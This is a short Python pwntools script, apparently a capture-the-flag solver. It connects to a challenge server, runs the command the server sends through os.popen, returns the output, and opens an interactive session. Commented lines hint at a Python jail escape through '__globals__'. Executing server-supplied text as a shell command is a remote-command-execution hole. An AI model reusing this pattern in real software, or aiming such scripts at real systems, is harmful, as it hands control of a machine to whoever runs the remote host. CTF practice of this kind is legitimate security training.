#!/usr/bin/env python3

import os
from pwn import *

HOST = 'mc.ax'
PORT = 31215

while True:
    conn = remote(HOST, PORT)

    given_str = conn.recvline().decode('utf-8')
    print(given_str[15:])

    conn.send(bytes(os.popen(given_str[15:]).read(), 'utf-8'))

    #print(conn.recv().decode('utf-8'), end='')

    #conn.send(bytes('headers.__init__.__globals__', 'utf-8'))

    #print(conn.recv().decode('utf-8'), end='')

    #output = conn.recvline().decode('utf-8')

    #for i in range(10):
        #print(conn.recvline().decode('utf-8'), end='')

    conn.interactive()

    conn.close()
    #if 'FLAG' in output:
        #break
